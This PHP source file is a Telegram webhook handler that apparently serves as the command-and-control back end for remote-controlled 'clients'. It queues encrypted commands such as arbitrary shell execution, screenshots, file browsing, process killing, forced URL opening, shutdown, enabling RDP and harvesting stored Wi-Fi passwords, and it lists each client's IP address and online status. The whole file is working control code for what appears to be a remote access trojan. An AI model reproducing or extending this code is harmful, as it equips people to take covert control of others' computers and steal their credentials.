<?php
namespace Handlers;

use Services\LoggerService;
use Services\TelegramService;
use Services\ClientService;
use Services\EncryptionService;
use PDO;

class WebhookHandler
{
    private $pdo;
    private $logger;
    private $telegram;
    private $clientService;
    private $encryption;

    public function __construct(PDO $pdo)
    {
        $this->pdo = $pdo;
        $this->logger = new LoggerService();
        $this->telegram = new TelegramService($this->logger);
        $this->clientService = new ClientService($pdo, $this->logger);
        $this->encryption = new EncryptionService($this->logger);
    }

    public function handle(array $update)
    {
        if (!$update) {
            http_response_code(400);
            $this->logger->logError("Invalid webhook request");
            die("Invalid request");
        }

        $this->logger->logWebhook(json_encode($update));

        if (isset($update['callback_query'])) {
            $callbackHandler = new CallbackQueryHandler($this->pdo, $this->logger, $this->telegram, $this->clientService);
            $callbackHandler->handle($update['callback_query']);
        } elseif (isset($update['message'])) {
            $this->processMessage($update['message']);
        }

        http_response_code(200);
    }

    private function processMessage(array $message)
    {
        $chatId = $message['chat']['id'] ?? null;
        $text = $message['text'] ?? '';
        $userId = $message['from']['id'] ?? null;

        $this->logger->logWebhook("Processing message: user_id=$userId, chat_id=$chatId, text=$text");

        if (!$this->clientService->isUserAuthorized($userId)) {
            $this->telegram->sendMessage($chatId, "Unauthorized access. Only the admin can issue commands.");
            $this->logger->logError("Unauthorized access attempt by user_id: $userId");
            return;
        }

        // Handle /select command
        if (preg_match('/^\/select\s+(.+)$/', $text, $matches)) {
            $clientId = trim($matches[1]);
            if ($this->clientService->clientExists($clientId)) {
                $this->clientService->setSelectedClient($userId, $clientId);
                $this->sendCommandKeyboard($chatId, "Selected client: $clientId. Choose a command:");
                $this->logger->logWebhook("Client selected via /select: $clientId, user_id: $userId, chat_id: $chatId");
            } else {
                $this->telegram->sendMessage($chatId, "Client ID '$clientId' not found. Use /start to see available clients.");
                $this->logger->logError("Invalid client_id in /select: $clientId, user_id: $userId, chat_id: $chatId");
            }
            return;
        }

        // Handle /start command
        if (preg_match('/^\/start$/', $text)) {
            $this->sendClientKeyboard($chatId);
            return;
        }

        // Handle /go command
        if (preg_match('/^\/go\s+(.+)$/', $text, $matches)) {
            $url = trim($matches[1]);
            $selectedClient = $this->clientService->getSelectedClient($userId);
            if ($selectedClient) {
                $this->processCommand('open_url', ['url' => $url], $selectedClient, $chatId);
                $this->logger->logWebhook("Open URL command queued: $url for client: $selectedClient");
            } else {
                $this->telegram->sendMessage($chatId, "No client selected. Use /start or /select <client_id>.");
                $this->logger->logError("Command attempted without selected client, user_id: $userId, chat_id: $chatId");
            }
            return;
        }

        // Handle other commands
        $selectedClient = $this->clientService->getSelectedClient($userId);
        if ($selectedClient) {
            // Parse command
            $commandType = $this->parseCommandType($text);
            $params = $this->parseCommandParams($text);
            
            if ($commandType) {
                $this->processCommand($commandType, $params, $selectedClient, $chatId);
                $this->logger->logWebhook("Command queued: $commandType for client: $selectedClient");
            } else {
                $this->telegram->sendMessage($chatId, "Unknown command. Use /start to see available commands.");
            }
        } else {
            $this->telegram->sendMessage($chatId, "No client selected. Use /start or /select <client_id>.");
        }
    }

    private function parseCommandType(string $text): ?string
    {
        // Map Telegram commands to internal command types
        $commandMap = [
            '/status' => 'status',
            '/screenshot' => 'capture_screenshot',
            '/exec' => 'system_command',
            '/shutdown' => 'system_command',
            '/restart' => 'system_command',
            '/sleep' => 'system_command',
            '/signout' => 'system_command',
            '/browse' => 'file_operation',
            '/get-info' => 'system_info',
            '/tasks' => 'process_management',
            '/end_task' => 'end_task',
            '/enable_rdp' => 'enable_rdp',
            '/disable_rdp' => 'disable_rdp',
            '/getwifipasswords' => 'get_wifi_passwords',
        ];

        foreach ($commandMap as $cmd => $type) {
            if (str_starts_with($text, $cmd)) {
                return $type;
            }
        }

        return null;
    }

    private function parseCommandParams(string $text): array
    {
        $params = [];

        // Handle /exec command
        if (preg_match('/^\/exec\s+(.+)$/', $text, $matches)) {
            $params['command'] = trim($matches[1]);
            return $params;
        }

        // Handle /browse command
        if (preg_match('/^\/browse\s+(.+)$/', $text, $matches)) {
            $params['action'] = 'list';
            $params['path'] = trim($matches[1]);
            return $params;
        }

        // Handle /end_task command
        if (preg_match('/^\/end_task\s+(.+)$/', $text, $matches)) {
            $params['process_name'] = trim($matches[1]);
            return $params;
        }

        // Handle system commands
        if (str_starts_with($text, '/shutdown')) {
            $params['command'] = 'shutdown';
        } elseif (str_starts_with($text, '/restart')) {
            $params['command'] = 'restart';
        } elseif (str_starts_with($text, '/sleep')) {
            $params['command'] = 'sleep';
        } elseif (str_starts_with($text, '/signout')) {
            $params['command'] = 'signout';
        }

        // Handle /tasks command
        if (str_starts_with($text, '/tasks')) {
            $params['action'] = 'list';
        }

        return $params;
    }

    private function processCommand(string $commandType, array $params, string $clientId, string $chatId): array
    {
        try {
            $commandData = [
                'type' => $commandType,
                'params' => $params
            ];
            
            $encryptedCommand = $this->encryption->encrypt(json_encode($commandData));
            
            $stmt = $this->pdo->prepare(
                "INSERT INTO client_commands (client_id, command, status, created_at) 
                VALUES (?, ?, 'pending', NOW())"
            );
            $stmt->execute([$clientId, $encryptedCommand]);
            
            $this->telegram->sendMessage($chatId, "Command '$commandType' queued for client $clientId.");
            $this->logger->logWebhook("Command queued: $commandType for client: $clientId, params: " . json_encode($params));
            
            return ['status' => 'success'];
        } catch (\PDOException $e) {
            $this->logger->logError("Failed to queue command for client_id: $clientId, error: " . $e->getMessage());
            $this->telegram->sendMessage($chatId, "Error: Failed to queue command.");
            return ['error' => 'Failed to queue command'];
        }
    }

    private function sendClientKeyboard(string $chatId)
    {
        $clients = $this->getClientStatus();
        if (empty($clients)) {
            $this->telegram->sendMessage($chatId, "No clients registered. Please ensure clients are connected. Use /select <client_id> to select directly.");
            $this->logger->logError("No clients found for keyboard, chat_id: $chatId");
            return;
        }

        $keyboard = ['inline_keyboard' => []];
        $row = [];
        foreach ($clients as $client) {
            $status = $client['is_online'] ? '🟢' : '🔴';
            $ip = $client['ip_address'] ?? 'Unknown';
            $row[] = [
                'text' => "$status {$client['client_id']} ($ip)",
                'callback_data' => "select_client:{$client['client_id']}"
            ];
            if (count($row) == 2) {
                $keyboard['inline_keyboard'][] = $row;
                $row = [];
            }
        }
        if ($row) {
            $keyboard['inline_keyboard'][] = $row;
        }

        $this->telegram->sendMessage($chatId, "Select a client:", ['reply_markup' => $keyboard]);
    }

    private function sendCommandKeyboard(string $chatId, string $message)
    {
        $commands = [
            '/status' => 'System Status',
            '/screenshot' => 'Take Screenshot',
            '/exec' => 'Execute Command',
            '/browse' => 'Browse Directory',
            '/get-info' => 'System Info',
            '/go' => 'Open URL',
            '/shutdown' => 'Shutdown',
            '/restart' => 'Restart',
            '/sleep' => 'Sleep',
            '/signout' => 'Sign Out',
            '/tasks' => 'List Tasks',
            '/end_task' => 'End Task',
            '/enable_rdp' => 'Enable RDP',
            '/disable_rdp' => 'Disable RDP',
            '/getwifipasswords' => 'Get Wi-Fi Passwords',
            '/select' => 'Select Client'
        ];

        $keyboard = ['inline_keyboard' => []];
        $row = [];
        foreach ($commands as $cmd => $label) {
            $row[] = ['text' => $label, 'callback_data' => "command:$cmd"];
            if (count($row) == 2) {
                $keyboard['inline_keyboard'][] = $row;
                $row = [];
            }
        }
        if ($row) {
            $keyboard['inline_keyboard'][] = $row;
        }

        $this->telegram->sendMessage($chatId, $message, ['reply_markup' => $keyboard]);
    }

    private function getClientStatus(): array
    {
        try {
            // Calculate online threshold timestamp
            $onlineThreshold = date('Y-m-d H:i:s', time() - \Config::$ONLINE_THRESHOLD);
            
            $stmt = $this->pdo->prepare(
                "SELECT client_id, ip_address, 
                IF(last_seen > ?, 1, 0) as is_online 
                FROM clients"
            );
            $stmt->execute([$onlineThreshold]);
            return $stmt->fetchAll();
        } catch (\PDOException $e) {
            $this->logger->logError("Failed to fetch client status: " . $e->getMessage());
            return [];
        }
    }
}